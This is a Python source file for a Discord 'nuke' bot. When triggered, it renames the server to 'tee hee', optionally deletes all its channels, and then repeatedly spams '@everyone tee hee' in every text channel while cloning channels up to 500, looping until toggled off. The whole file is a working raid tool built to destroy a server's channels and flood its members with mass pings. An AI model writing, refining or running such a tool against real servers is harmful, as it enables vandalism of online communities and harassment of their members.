import time
import discord
from discord import Intents, Client, Message
from progress import progressBar

nuke_toggle = False
def get_nuke_toggle():
    return nuke_toggle
def set_nuke_toggle(toggle):
    global nuke_toggle
    nuke_toggle = toggle
count = 0
start_time = 0
pings = 0
time_took = 0

def get_time(seconds):
    if seconds > 3600: 
        hours = round((seconds / 60) / 60)
        seconds -= hours * 60
        minutes =  round(seconds / 60)
        seconds -= minutes * 60
        time_took = f"{round(hours)} hours, {abs(round(minutes))} minutes, and {abs(round(seconds, 2))} seconds"
    elif seconds > 60:
        minutes =  round(seconds / 60)
        seconds -= minutes * 60
        time_took = f"{round(minutes)} minutes and {abs(round(seconds, 2))} seconds"
    else:
        time_took = f"{round(seconds, 2)} seconds"
    return time_took

async def start_nuke(interation, shouldDelete):
    set_nuke_toggle(True)
    global start_time
    start_time = time.time()
    await interation.response.send_message("The nuke has been dropped...")
    await interation.guild.edit(name='tee hee', community=False)
    if shouldDelete: 
        print(time.asctime(time.localtime()),": Attempting to delete all channels")
        for i in progressBar(interation.guild.channels, prefix='Progress:', suffix='Complete'):
            await i.delete()
        print(time.asctime(time.localtime()),": Finished, starting nuke")
        await interation.guild.create_text_channel(name='tee hee')
    print('-------------------------------')
    await nuke_loop(interation)

async def nuke_loop(interation):
    channels = interation.guild.text_channels
    global pings, count, time_took
    pings += len(channels)
    pings2 = pings + len(channels)*2
    count +=1
    seconds = time.time() - start_time
    time_took = get_time(seconds)
    print(f'-- starting ping')
    for i in progressBar(channels, prefix = 'Progress:', suffix = 'Complete', fill='🟥'):
        await i.send("# @everyone tee hee")
        time.sleep(0.1)
    print(f'-- finished ping, starting clone')
    for i in progressBar(channels, prefix = 'Progress:', suffix = 'Complete', fill='🟦'):
        if len(channels) < 500: await i.clone()
        else: break
        time.sleep(0.1)
    print('-- finished clone')
    print(f'-------------------------------\n{time.asctime(time.localtime())}\nPinged @everyone {pings} times, working to {pings2}\nCreated {len(interation.guild.channels)} channels\nRun {count} times and has been running for {time_took} ({round(seconds, 5)} seconds)\n-------------------------------')
    if get_nuke_toggle(): await nuke_loop(interation)
